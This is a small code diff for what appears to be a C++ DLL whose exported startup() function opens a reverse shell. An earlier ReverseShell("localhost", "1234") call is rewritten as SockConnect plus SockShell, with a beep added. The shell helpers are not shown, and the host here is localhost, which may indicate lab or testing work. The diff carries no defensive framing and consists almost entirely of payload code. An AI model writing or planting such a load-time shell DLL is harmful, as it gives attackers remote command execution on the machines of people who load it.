@@ -5,7 +5,10 @@
 
 extern "C" __declspec(dllexport) void startup()
 {
-    ReverseShell("localhost", "1234");
+    MessageBeep(MB_ICONERROR);
+
+    SockConnect("localhost", "1234");
+    SockShell();    
     ExitThread(0);
 }
 
